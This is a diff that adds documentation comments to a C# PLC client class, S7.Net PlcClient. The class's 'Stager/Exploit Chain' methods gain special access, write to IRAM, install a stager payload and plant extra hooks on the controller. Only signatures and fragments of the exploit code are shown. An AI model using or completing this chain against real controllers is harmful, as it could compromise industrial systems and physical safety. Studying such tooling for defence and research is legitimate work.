@@ -10,12 +10,20 @@ using System.Threading;
 
 namespace S7.Net
 {
+    /// <summary>
+    /// The main client for communicating with the PLC.
+    /// </summary>
     public class PlcClient
     {
         private readonly ICommunicationChannel _channel;
         private readonly PlcProtocol _protocol;
         private readonly Action<string> _log;
 
+        /// <summary>
+        /// Initializes a new instance of the <see cref="PlcClient"/> class.
+        /// </summary>
+        /// <param name="channel">The communication channel to use.</param>
+        /// <param name="logger">The logging action.</param>
         public PlcClient(ICommunicationChannel channel, Action<string> logger)
         {
             _channel = channel;
@@ -23,8 +31,18 @@ namespace S7.Net
             _protocol = new PlcProtocol(channel, logger);
         }
 
+        /// <summary>
+        /// Indicates whether the client is connected to the PLC.
+        /// </summary>
         public bool IsConnected => _channel.IsConnected;
 
+        /// <summary>
+        /// Invokes a primary handler on the PLC.
+        /// </summary>
+        /// <param name="handlerIndex">The index of the handler to invoke.</param>
+        /// <param name="args">The arguments to pass to the handler.</param>
+        /// <param name="awaitResponse">Whether to wait for a response.</param>
+        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
         public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -36,6 +54,10 @@ namespace S7.Net
         }
 
         #region Stager/Exploit Chain
+        /// <summary>
+        /// Performs the initial handshake to gain special access to the PLC.
+        /// </summary>
+        /// <returns>True if the handshake was successful, false otherwise.</returns>
         public async Task<bool> PerformHandshakeAsync()
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -65,6 +87,10 @@ namespace S7.Net
             return false;
         }
 
+        /// <summary>
+        /// Gets the version of the PLC bootloader.
+        /// </summary>
+        /// <returns>The version string.</returns>
         public async Task<string> GetVersion()
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -76,6 +102,10 @@ namespace S7.Net
             return version;
         }
 
+        /// <summary>
+        /// Enters a subprotocol mode.
+        /// </summary>
+        /// <param name="mode">The mode to enter.</param>
         private async Task EnterSubprotocol(int mode)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -89,6 +119,9 @@ namespace S7.Net
             _log("Entered subprotocol successfully.");
         }
 
+        /// <summary>
+        /// Leaves the current subprotocol mode.
+        /// </summary>
         private async Task LeaveSubprotocol()
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -97,6 +130,11 @@ namespace S7.Net
             await _protocol.ReceivePacketAsync();
         }
 
+        /// <summary>
+        /// Writes data to the PLC in subprotocol mode.
+        /// </summary>
+        /// <param name="address">The address to write to.</param>
+        /// <param name="data">The data to write.</param>
         private async Task RawSubprotocolWrite(uint address, byte[] data)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -113,6 +151,11 @@ namespace S7.Net
             await _protocol.ReceivePacketAsync();
         }
 
+        /// <summary>
+        /// Writes a chunk of data to IRAM.
+        /// </summary>
+        /// <param name="targetAddress">The target address in IRAM.</param>
+        /// <param name="contents">The data to write.</param>
         private async Task WriteChunkToIram(uint targetAddress, byte[] contents)
         {
             uint targetArgument = targetAddress - 0x10000000;
@@ -122,6 +165,11 @@ namespace S7.Net
             await RawSubprotocolWrite(targetArgument, contents);
         }
 
+        /// <summary>
+        /// Writes data to IRAM.
+        /// </summary>
+        /// <param name="targetAddress">The target address in IRAM.</param>
+        /// <param name="contents">The data to write.</param>
         public async Task WriteToIram(uint targetAddress, byte[] contents)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -142,6 +190,10 @@ namespace S7.Net
             _log("Finished writing to IRAM.");
         }
 
+        /// <summary>
+        /// Installs the stager payload onto the PLC.
+        /// </summary>
+        /// <param name="stagerPayload">The stager payload to install.</param>
         public async Task InstallStager(byte[] stagerPayload)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -166,6 +218,11 @@ namespace S7.Net
         #endregion
 
         #region Stager Communication
+        /// <summary>
+        /// Encodes a packet for transmission via the stager.
+        /// </summary>
+        /// <param name="chunk">The chunk to encode.</param>
+        /// <returns>The encoded packet.</returns>
         private byte[] EncodePacketForStager(byte[] chunk)
         {
             for (int i = 1; i < 256; i++)
@@ -187,6 +244,10 @@ namespace S7.Net
             throw new Exception("Could not find a suitable XOR key to encode chunk.");
         }
 
+        /// <summary>
+        /// Sends a full message via the stager.
+        /// </summary>
+        /// <param name="msg">The message to send.</param>
         public async Task SendFullMsgViaStager(byte[] msg)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -213,6 +274,13 @@ namespace S7.Net
             await _protocol.ReceivePacketAsync();
         }
 
+        /// <summary>
+        /// Invokes an additional hook on the PLC.
+        /// </summary>
+        /// <param name="hookNo">The hook number to invoke.</param>
+        /// <param name="args">The arguments to pass to the hook.</param>
+        /// <param name="awaitResponse">Whether to wait for a response.</param>
+        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
         public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -226,6 +294,11 @@ namespace S7.Net
             return await InvokePrimaryHandler(0x1c, payload, awaitResponse);
         }
 
+        /// <summary>
+        /// Writes data to the PLC via the stager.
+        /// </summary>
+        /// <param name="address">The address to write to.</param>
+        /// <param name="contents">The data to write.</param>
         public async Task WriteViaStager(uint address, byte[] contents)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -240,6 +313,12 @@ namespace S7.Net
             await SendFullMsgViaStager(contents);
         }
 
+        /// <summary>
+        /// Installs an additional hook via the stager.
+        /// </summary>
+        /// <param name="targetAddress">The target address of the new hook.</param>
+        /// <param name="payload">The payload of the new hook.</param>
+        /// <param name="newHookNo">The new hook number.</param>
         public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -256,6 +335,12 @@ namespace S7.Net
             await WriteViaStager(targetAddress, payload);
         }
 
+        /// <summary>
+        /// Receives a large amount of data from the PLC.
+        /// </summary>
+        /// <param name="progress">The progress reporter.</param>
+        /// <param name="timeoutMs">The timeout in milliseconds.</param>
+        /// <returns>The received data.</returns>
         public async Task<byte[]> ReceiveMany(IProgress<long> progress, int timeoutMs = 5000)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
